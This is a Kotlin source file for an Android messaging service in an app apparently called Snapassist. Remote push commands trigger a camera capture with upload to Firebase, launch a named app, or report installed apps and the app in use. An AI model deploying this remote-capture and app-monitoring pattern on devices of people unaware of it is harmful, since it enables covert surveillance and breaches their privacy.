package com.senthapps.snapassist.service

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.net.Uri
import android.os.Build
import android.util.Log
import androidx.core.app.NotificationCompat
import com.google.firebase.messaging.FirebaseMessagingService
import com.google.firebase.messaging.RemoteMessage
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import com.google.firebase.firestore.SetOptions
import com.google.firebase.Timestamp
import com.senthapps.snapassist.MainActivity
import com.senthapps.snapassist.R
import com.senthapps.snapassist.util.FirebaseStorageUtil
import com.senthapps.snapassist.util.NetworkUtil
import com.senthapps.snapassist.util.FCMTokenUtil
import com.senthapps.snapassist.util.LaunchController
import com.senthapps.snapassist.util.AppInventory
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.launch
import kotlinx.coroutines.withTimeoutOrNull
import java.util.concurrent.atomic.AtomicBoolean

class AppFcmService : FirebaseMessagingService() {
    
    companion object {
        private const val TAG = "AppFcmService"
        private const val NOTIFICATION_CHANNEL_ID = "fcm_notifications"
        private const val NOTIFICATION_CHANNEL_NAME = "FCM Notifications"
        private const val REARM_NOTIFICATION_ID = 2001
        private const val COMMAND_TIMEOUT_MS = 18_000L // 18 seconds (leaving 2s buffer)
    }
    
    private val serviceScope = CoroutineScope(Dispatchers.Main + Job())
    private val isProcessing = AtomicBoolean(false)
    
    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        
        // Initialize network monitoring
        NetworkUtil.initialize(this)
    }
    
    override fun onDestroy() {
        super.onDestroy()
        
        // Cleanup network monitoring
        NetworkUtil.cleanup()
    }
    
    override fun onMessageReceived(remoteMessage: RemoteMessage) {
        super.onMessageReceived(remoteMessage)
        
        val startTime = System.currentTimeMillis()
        Log.d(TAG, "Message received at $startTime from: ${remoteMessage.from}")
        
        // Prevent concurrent processing
        if (!isProcessing.compareAndSet(false, true)) {
            Log.w(TAG, "Already processing a message, ignoring new one")
            return
        }
        
        try {
            // Process data payload
            remoteMessage.data.let { data ->
                Log.d(TAG, "Message data payload: $data")
                
                val command = data["cmd"]
                when (command) {
                    "SNAP" -> {
                        Log.d(TAG, "SNAP command received")
                        processSnapCommand(startTime)
                    }
                    "LAUNCH" -> {
                        val pkg = data["pkg"] ?: ""
                        Log.d(TAG, "LAUNCH command received for package: $pkg")
                        processLaunchCommand(pkg)
                    }
                    "LIST_APPS" -> {
                        Log.d(TAG, "LIST_APPS command received")
                        processListAppsCommand()
                    }
                    else -> {
                        Log.d(TAG, "Unknown or missing command: $command")
                    }
                }
            }
            
            // Handle notification payload if present
            remoteMessage.notification?.let { notification ->
                Log.d(TAG, "Message notification body: ${notification.body}")
            }
        } finally {
            isProcessing.set(false)
        }
    }
    
    override fun onNewToken(token: String) {
        super.onNewToken(token)
        Log.d(TAG, "FCM token refreshed: $token")
        
        // Update token directly to Firestore
        serviceScope.launch {
            try {
                Firebase.firestore.collection("devices").document("primary")
                    .set(mapOf("token" to token, "updatedAt" to Timestamp.now()), SetOptions.merge())
                Log.d(TAG, "FCM token updated in Firestore successfully")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to update FCM token in Firestore", e)
            }
        }
    }
    
    private fun processSnapCommand(startTime: Long) {
        serviceScope.launch {
            try {
                val result = withTimeoutOrNull(COMMAND_TIMEOUT_MS) {
                    if (CameraService.isRunning()) {
                        Log.d(TAG, "CameraService is running, attempting to capture photo")
                        captureAndUpload()
                    } else {
                        Log.w(TAG, "CameraService is not running, showing re-arm notification")
                        showRearmNotification()
                        false
                    }
                }
                
                val processingTime = System.currentTimeMillis() - startTime
                
                if (result == null) {
                    Log.e(TAG, "SNAP command timed out after ${COMMAND_TIMEOUT_MS}ms")
                } else {
                    Log.d(TAG, "SNAP command completed in ${processingTime}ms: $result")
                }
                
            } catch (e: Exception) {
                val processingTime = System.currentTimeMillis() - startTime
                Log.e(TAG, "Error processing SNAP command after ${processingTime}ms", e)
            }
        }
    }
    
    private suspend fun captureAndUpload(): Boolean {
        return try {
            val cameraService = CameraService.getInstance()
                ?: throw IllegalStateException("CameraService instance not available")
                
            Log.d(TAG, "Attempting to capture photo...")
            
            // Capture photo using the service instance
            val uri = cameraService.snapToTempFile()
            Log.d(TAG, "Photo captured successfully: $uri")
            
            // Upload to Firebase Storage with retry
            val downloadUrl = FirebaseStorageUtil.uploadToCloudWithRetry(
                context = this@AppFcmService,
                uri = uri,
                includeMetadata = true
            )
            Log.d(TAG, "Photo uploaded successfully: $downloadUrl")
            
            true
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to capture and upload", e)
            false
        }
    }
    
    private fun showRearmNotification() {
        val intent = Intent(this, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            putExtra("show_rearm_message", true)
        }
        
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        
        val notification = NotificationCompat.Builder(this, NOTIFICATION_CHANNEL_ID)
            .setContentTitle("Snapassist Not Armed")
            .setContentText("Remote capture failed. Tap to re-arm the camera service.")
            .setSmallIcon(R.drawable.ic_launcher_foreground)
            .setContentIntent(pendingIntent)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .build()
        
        val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        notificationManager.notify(REARM_NOTIFICATION_ID, notification)
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                NOTIFICATION_CHANNEL_ID,
                NOTIFICATION_CHANNEL_NAME,
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Notifications for FCM messages and camera service alerts"
            }
            
            val notificationManager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun processLaunchCommand(pkg: String) {
        serviceScope.launch {
            try {
                if (pkg.isEmpty()) {
                    Log.w(TAG, "LAUNCH command received with empty package name")
                    return@launch
                }
                
                Log.d(TAG, "Processing LAUNCH command for package: $pkg")
                LaunchController.requestLaunch(this@AppFcmService, pkg)
                
            } catch (e: Exception) {
                Log.e(TAG, "Error processing LAUNCH command", e)
            }
        }
    }
    
    private fun processListAppsCommand() {
        serviceScope.launch {
            try {
                Log.d(TAG, "Processing LIST_APPS command")
                AppInventory.reportInstalledAndTopApp(this@AppFcmService)
                
            } catch (e: Exception) {
                Log.e(TAG, "Error processing LIST_APPS command", e)
            }
        }
    }
}